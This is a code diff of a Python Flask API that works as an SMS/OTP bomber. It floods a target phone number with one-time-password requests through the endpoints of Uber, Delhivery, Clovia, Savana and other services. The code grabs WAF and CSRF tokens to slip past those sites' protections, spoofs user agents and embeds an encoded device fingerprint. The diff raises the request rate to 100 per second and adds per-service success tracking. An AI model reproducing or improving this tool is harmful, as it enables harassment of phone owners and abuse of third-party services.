@@ -41,6 +41,7 @@ requests_data = load_json(REQUESTS_FILE, [])
 stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0})
 logs_data = load_json(LOGS_FILE, [])
 active_keys = set()
+service_stats = {}  # Per-service stats
 
 # ===== LOAD KEYS =====
 def load_keys_from_github():
@@ -216,7 +217,6 @@ def get_savana_session():
     try:
         resp = session.get('https://www.savana.com/', headers=headers, timeout=10)
         cookies = session.cookies.get_dict()
-        # Extract Vtoken from cookies or response
         vtoken = cookies.get('ub_ap_s_vtoken', str(random.randint(1000000000, 9999999999)))
         return session, cookies, vtoken
     except Exception as e:
@@ -232,13 +232,15 @@ def generate_savana_uuid():
 def generate_uber_device_data():
     return "IsOFwpJePcOFw5sVO8KFwoIBb8OWw5QPbMKEw5UFbcOXw5YFe8OLw4NoLcOFw5sVGMKEwotBIcKpwqlHD8Ofw5RYGsKFwpNeGsKQw5QFG8KfwrQYPcKLwrddKMK2w4ocPMKIwotSCsKewph8OsK+wqhyO8Kjwph4DcKCwrZYA8KGwqZGL8KewpRaaMKOwodVMMK1wqt/HcK0w5V0dsK/wqdZdsOWwot7dsKuwolkMsKVwo0CbcOVwpJWK8Klw5F8I8KhwqAEdsKTwrFaIcK3wrlnDcKlwoleA8KBwqN+F8KfwrtyNsKWwoZiEcKywpkBNsKuwohkK8KFwoYCNsKSwowGC8K2w5N7KMKsw5lcYcKXw5VQFMKVw4pTH8KKwrVxM8KhwqdRH8KlwptbFMKBwoBtCMKqwrAAPMKOwrRULcKuw45wKsKBwptBMcKBwrgYOMKOwrdAYMKBw5QFDcKGw5IBE8KlwplfN8OQw5JuFMKMwpt8FcOfwqRxa8KCwrJ/DMK+wq1CCsKTw5RAdsKLwpFaIcKsw5NHbcKhw4pOHMKLwrZ0NsKzwq0OO8KSwrN7IcKlwq0DIMKiwqtGCcKowq1WaMKNw5EBMcKzwpRADMOUwrdZMsOVwrNgN8KmwpVHD8KEwqlWNMKJwpEPHMKkwrkEe8OLw4NUP8K4wodbOMKAwpIVY8OFw5AHa8OVw5gBasOFw40VP8KVwoREMcOKwoJYNsKMwohSe8Odw4NDK8KSwoQVdcOFwoJYNsKMwohSdMK4woJUe8Odw4N2OsKNwpdPF8KvwpFhYcOSwo50O8KVwoh0LsOSw5N1IcKyw4QFH8OFw40VLcKOwoxSdMKSwo9eIcOKwoRHNsKEwokaNMKUw4MNaMOQw5kPbcOXw5kDbcOew5MFaMOLw4NDMMKKwoQaNcKIwoJWNcOFw5sVYMOIw5IYa8OXw5MBdcOHw5AFY8OXw5YNa8Oew4F2FMOFw40VLcKOwoxSdMKUwpVFMMKJwoYVY8OFwrVfLMOHwrJSKcOHw5EEecOVw5EFb8OHw5EHY8OXw5YNa8Oew4FwFMKzw4wHbcOXw5EXccKiwoBELcKCwpNZecKjwoBONcKOwoZfLcOHwrVeNMKCw4gVdcOFwpVeNMKCw4xDI8OKwo5RP8KUwoRDdMKKwohZLMKTwoREe8Odw5MDacOLw4NDMMKKwoQaLcKdw4xfOMKUw4xTKsKTw4MNe8KTwpNCPMOFw40VLcKOwoxSdMKTwpsaPcKUwpUaOMKEwpVeL8KCw4MNe8KTwpNCPMOFw40VLcKOwoxSdMKTwpsaKsKTwoUaNsKBwodEPMKTw4MNa8OTw5Ebe8KTwohaPMOKwpVNdMKBwohPPMKDw4xbNsKEwoBbPMOKwpJDK8KOwo9Qe8Odw4MEdsORw44FacOWw5UbecOQw5sCYcOdw5IOecKmwqwVdcOFwoVYNMOKwo1YOsKGwo0aLcKGwoYVY8OFwqBUM8KRwpl5EcKXwrcPbMKIwqJVK8KOwqJAbMOVwqNPDMOIw4Mbe8KDwo5adMKUwoREKsKOwo5ZdMKTwoBQe8Odw4N2OsKNwpdPF8KvwpFhYcOSwo50O8KVwoh0LsOSw5N1IcKyw44VdcOFwo9WL8KOwoZWLcKIwpMZOMKXwpFhPMKVwpJeNsKJw4MNe8OSw48HecOPwrkGaMOOw4Mbe8KJwoBBMMKAwoBDNsKVw49WKcKXwq9WNMKCw4MNe8KpwoRDKsKEwoBHPMOFw40VN8KGwpdePsKGwpVYK8OJwoNCMMKLwoV+HcOFw5sVa8OXw5APaMOXw5EGacOXw5EHacOXw4Mbe8KJwoBBMMKAwoBDNsKVw49HK8KIwoVCOsKTw4MNe8KgwoRUMsKIw4Mbe8KJwoBBMMKAwoBDNsKVw49HNcKGwpVRNsKVwowVY8OFwq1eN8KSwpkXIcOfw5dob8OTw4Mbe8KJwoBBMMKAwoBDNsKVw49bOMKJwoZCOMKAwoQVY8OFwoRZdMKywrIVdcOFwo9WL8KOwoZWLcKIwpMZNsKUwoJHLMOFw5sVFcKOwo9CIcOHwpkPb8K4w5cDe8OLw4NZOMKRwohQOMKTwo5Fd8KSwpJSK8KmwoZSN8KTw4MNe8Kqwo5NMMKLwo1WdsOSw48HecOPwrkGaMOcw4F7MMKJwpRPecKfw5kBBsORw5UMecKVwpcNaMOTw5EZacOOw4FwPMKEwopYdsOVw5EGacOXw5AHaMOHwqdeK8KCwodYIcOIw5ADacOJw5EVdcOFwo9WL8KOwoZWLcKIwpMZOsKIwo5cMMKCwqRZOMKFwo1SPcOFw5sVLcKVwpRSe8OLw4NZOMKRwohQOMKTwo5Fd8KGwpFHGsKIwoVSF8KGwoxSe8Odw4N6NsKdwohbNcKGw4Mbe8KJwoBBMMKAwoBDNsKVw49HK8KIwoVCOsKTwrJCO8OFw5sVa8OXw5AHacOWw5EGe8OLw4NZOMKRwohQOMKTwo5Fd8KPwoBFPcKQwoBFPMKkwo5ZOsKSwpNFPMKJwoJOe8Odw4MFe8OLw4NDNsKSwoJfHMKJwoBVNcKCwoUVY8KBwoBbKsKCw40VN8KGwpdePsKGwpVYK8OJwoBCLcKIwoxWLcKOwo5ZHMKJwoBVNcKCwoUVY8KBwoBbKsKCw40VN8KGwpdePsKGwpVYK8OJwoVYF8KIwpVjK8KGwoJce8Odw4NCN8KUwpFSOsKOwodePMKDw4Mbe8KQwoRVPcKVwohBPMKVwr5TPMKTwoRULcOFw5tROMKLwpJSdcOFwpZeN8KDwo5Ad8KEwo1ePMKJwpV+N8KBwo5FNMKGwpVeNsKJw49bOMKJwoZCOMKAwoQVY8OFwoRZdMKywrIVdcOFwpZeN8KDwo5Ad8KPwohELcKIwpNOd8KLwoRZPsKTwokVY8OFw5UVdcOFwpZeN8KDwo5Ad8KDwoRBMMKEwoRnMMKfwoRbC8KGwpVeNsOFw5sVaMOFw40VLsKOwo9TNsKQw49EOsKVwoRSN8OJwolSMMKAwolDe8Odw4MBb8OVw4Mbe8KQwohZPcKIwpYZKsKEwpNSPMKJw49AMMKDwpVfe8Odw4MGasORw5cVdcOFwpZeN8KDwo5Ad8KUwoJFPMKCwo8ZOsKIwo1YK8KjwoRHLcKPw4MNe8OVw5UVdcOFwpZeN8KDwo5Ad8KUwoJFPMKCwo8ZOMKRwoBeNcKvwoRePsKPwpUVY8OFw5cFbsOFw40VLsKOwo9TNsKQw49EOsKVwoRSN8OJwpFeIcKCwo1zPMKXwpVfe8Odw4MFbcOFw40VLsKOwo9TNsKQw49YLMKTwoRFDsKOwoVDMcOFw5sVbsOUw5AVdcOFwpZeN8KDwo5Ad8KIwpRDPMKVwqlSMMKAwolDe8Odw4MBbsORw4Mbe8KQwohZPcKIwpYZMMKJwo9SK8KwwohTLcKPw4MNe8ORw5kEe8OLw4NAMMKJwoVYLsOJwohZN8KCwpN/PMKOwoZfLcOFw5sVbMOWw5EVdcOFwpJUK8KCwoRZd8KGwpdWMMKLwrZePcKTwokVY8OFw5AEb8ORw4Mbe8KUwoJFPMKCwo8ZOMKRwoBeNcKvwoRePsKPwpUVY8OFw5cFbsOFw40VLsKOwo9TNsKQw49EOsKVwoRSN8OJwo5FMMKCwo9DOMKTwohYN8OJwpVOKcKCw4MNe8KLwoBZPcKUwoJWKcKCw4xHK8KOwoxWK8Kew4Mbe8KQwohZPcKIwpYZKsKEwpNSPMKJw49YK8KOwoRZLcKGwpVeNsKJw49WN8KAwo1Se8Odw4MHe8OLw4NAMMKJwoVYLsOJwpJUK8KCwoRZd8KDwoBFMsKqwo5TPMOJwoRZOMKFwo1SPcOFw5tDK8KSwoQbe8KJwoBBMMKAwoBDNsKVw49HNcKSwoZeN8KUw49UNsKSwo9De8Odw5Qbe8KXwo1CPsKOwo8aCcKjwqcXD8KOwoRAPMKVw4xRMMKLwoRZOMKKwoQVY8OFwohZLcKCwpNZOMKLw4xHPcKBw4xBMMKCwpZSK8OFw40VKcKLwpRQMMKJw4xnHcKhw4FhMMKCwpZSK8OKwoVSKsKEw4MNe8K3wo5FLcKGwoNbPMOHwqVYOsKSwoxSN8KTw4FxNsKVwoxWLcOFw40VKcKLwpRQMMKJw4x0McKVwo5aPMOHwrFzH8OHwrdePMKQwoRFdMKBwohbPMKJwoBaPMOFw5sVMMKJwpVSK8KJwoBbdMKXwoVRdMKRwohSLsKCwpMVdcOFwpFbLMKAwohZdMKkwolFNsKKwoQXCcKjwqcXD8KOwoRAPMKVw4xTPMKUwoIVY8OFwrFYK8KTwoBVNcKCw4FzNsKEwpRaPMKJwpUX"
 
-# ===== SEND REQUEST (ALL 7 SERVICES) =====
+# ===== SEND REQUEST WITH PER-SERVICE STATS =====
 def send_request(req, phone):
-    name = req['name'].lower()
+    name = req['name']
     try:
-        if 'pansho' in name:
+        if 'pansho' in name.lower():
             session, cookies, token = get_pansho_session()
-            if not session: return False
+            if not session: 
+                update_service_stats(name, False)
+                return False
             headers = req['headers'].copy()
             headers['User-Agent'] = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'])
             headers['Referer'] = 'https://pansho.com/'
@@ -246,9 +248,11 @@ def send_request(req, phone):
             session.cookies.update(cookies)
             r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=10)
 
-        elif 'uber' in name:
+        elif 'uber' in name.lower():
             session, challenge_token = get_uber_token()
-            if not session: return False
+            if not session: 
+                update_service_stats(name, False)
+                return False
             headers = req['headers'].copy()
             headers['X-Uber-Challenge-Token'] = challenge_token
             body = json.loads(json.dumps(req['body']))
@@ -257,17 +261,21 @@ def send_request(req, phone):
             body['formContainerAnswer']['formAnswer']['screenAnswers'][0]['fieldAnswers'][1]['phoneNumber'] = phone.replace('+91', '').replace('91', '')
             r = session.post(req['url'], headers=headers, json=body, timeout=10)
 
-        elif 'delhivery' in name:
+        elif 'delhivery' in name.lower():
             session, waf_token = get_delhivery_token()
-            if not session: return False
+            if not session: 
+                update_service_stats(name, False)
+                return False
             headers = req['headers'].copy()
             headers['X-Aws-Waf-Token'] = waf_token
             clean_phone = phone.replace('+91', '').replace('91', '').strip()
             r = session.get(req['url'].replace('{phone}', clean_phone), headers=headers, timeout=10)
 
-        elif 'clovia' in name:
+        elif 'clovia' in name.lower():
             session, cookies, csrf_token = get_clovia_session()
-            if not session: return False
+            if not session: 
+                update_service_stats(name, False)
+                return False
             headers = req['headers'].copy()
             headers['X-Csrftoken'] = csrf_token
             headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -277,9 +285,11 @@ def send_request(req, phone):
             session.cookies.update(cookies)
             r = session.post(req['url'], headers=headers, json=body, timeout=10)
 
-        elif 'apitxt' in name:
+        elif 'apitxt' in name.lower():
             session, cookies = get_apitxt_session()
-            if not session: return False
+            if not session: 
+                update_service_stats(name, False)
+                return False
             headers = req['headers'].copy()
             headers['User-Agent'] = random.choice([
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -294,9 +304,11 @@ def send_request(req, phone):
             session.cookies.update(cookies)
             r = session.post(req['url'], headers=headers, json=body, timeout=10)
 
-        elif 'savana' in name:
+        elif 'savana' in name.lower():
             session, cookies, vtoken = get_savana_session()
-            if not session: return False
+            if not session: 
+                update_service_stats(name, False)
+                return False
             headers = req['headers'].copy()
             headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             headers['Vtoken'] = vtoken
@@ -326,16 +338,19 @@ def send_request(req, phone):
             else:
                 r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=10)
 
+        # Update global stats
         with stats_lock:
             stats_data['total_requests'] += 1
             if r.status_code in [200, 302, 201, 202]:
                 stats_data['success'] += 1
                 save_json(STATS_FILE, stats_data)
+                update_service_stats(name, True)
                 return True
             else:
                 stats_data['failed'] += 1
                 save_json(STATS_FILE, stats_data)
-                print(f"❌ {req['name']} | {r.status_code}")
+                update_service_stats(name, False)
+                print(f"❌ {name} | {r.status_code}")
                 return False
 
     except Exception as e:
@@ -343,11 +358,25 @@ def send_request(req, phone):
             stats_data['total_requests'] += 1
             stats_data['failed'] += 1
             save_json(STATS_FILE, stats_data)
-        print(f"❌ ERROR: {req['name']} | {str(e)[:50]}")
+            update_service_stats(name, False)
+        print(f"❌ ERROR: {name} | {str(e)[:50]}")
         return False
 
-# ===== ONE-SHOT BOMBING (VIOLENT SPEED) =====
-def parallel_bombing(phone, key, speed=20, otp_count=99):
+def update_service_stats(name, success):
+    with stats_lock:
+        if name not in service_stats:
+            service_stats[name] = {"success": 0, "failed": 0, "total": 0}
+        service_stats[name]["total"] += 1
+        if success:
+            service_stats[name]["success"] += 1
+        else:
+            service_stats[name]["failed"] += 1
+
+# ===== ONE-SHOT BOMBING (PARALLEL + HIGH SPEED) =====
+def parallel_bombing(phone, key, speed=50, otp_count=99):
+    global service_stats
+    service_stats = {}  # Reset per-service stats
+    
     active_requests = [r for r in requests_data if r.get('active', True)]
     if not active_requests:
         return {"error": "No active requests"}
@@ -359,6 +388,7 @@ def parallel_bombing(phone, key, speed=20, otp_count=99):
     total_hits = 0
     success_hits = 0
     
+    # Parallel execution with high speed
     with ThreadPoolExecutor(max_workers=min(len(active_requests) * 20, 100)) as executor:
         futures = []
         req_map = {}
@@ -369,8 +399,10 @@ def parallel_bombing(phone, key, speed=20, otp_count=99):
                 future = executor.submit(send_request, req, target_phone)
                 futures.append(future)
                 req_map[future] = {'request': req['name'], 'hit': i + 1, 'phone': target_phone}
+                # Minimal delay for high speed
                 time.sleep(1.0 / speed / len(active_requests) if speed > 0 else 0.001)
         
+        # Collect results
         for future in as_completed(futures):
             success = future.result(timeout=15)
             info = req_map[future]
@@ -386,13 +418,13 @@ def parallel_bombing(phone, key, speed=20, otp_count=99):
         "success": True,
         "phone": phone,
         "key": key,
-        "active_requests": len(active_requests),
         "otp_per_request": otp_count,
         "speed": f"{speed} req/sec",
         "total_hits": total_hits,
         "success_hits": success_hits,
         "failed_hits": total_hits - success_hits,
         "stats": stats_data,
+        "per_service": service_stats,  # 🔥 PER-SERVICE BREAKDOWN
         "owner": "Gaurav Beniwal",
         "telegram": "@gaurav_beniwal_0001",
         "youtube": "https://www.youtube.com/@gaurav_beniwal_0001"
@@ -413,7 +445,7 @@ def get_requests():
 @app.route('/api/stats', methods=['GET'])
 def get_stats():
     active_count = sum(1 for r in requests_data if r.get('active', True))
-    return jsonify({"total_requests": len(requests_data), "active_requests": active_count, "usage": stats_data, "active_keys": len(active_keys)})
+    return jsonify({"total_requests": len(requests_data), "active_requests": active_count, "usage": stats_data, "active_keys": len(active_keys), "per_service": service_stats})
 
 @app.route('/api/keys', methods=['GET'])
 def get_keys():
@@ -434,8 +466,8 @@ def get_logs():
 def parallel_api():
     key = request.args.get('key')
     phone = request.args.get('bomb')
-    speed = request.args.get('speed', 20, type=int)
-    otp_count = request.args.get('otp', 99, type=int)
+    speed = request.args.get('speed', 50, type=int)
+    otp_count = request.args.get('otp', 50, type=int)  # 🔥 Default 50
     
     if not key:
         return jsonify({"error": "Missing 'key'"}), 400
@@ -443,8 +475,8 @@ def parallel_api():
         return jsonify({"error": "Invalid API key"}), 401
     if not phone:
         return jsonify({"error": "Missing 'bomb'"}), 400
-    if speed < 1 or speed > 30:
-        return jsonify({"error": "Speed 1-30"}), 400
+    if speed < 1 or speed > 100:
+        return jsonify({"error": "Speed 1-100"}), 400
     if otp_count < 1 or otp_count > 500:
         return jsonify({"error": "OTP count 1-500"}), 400
     
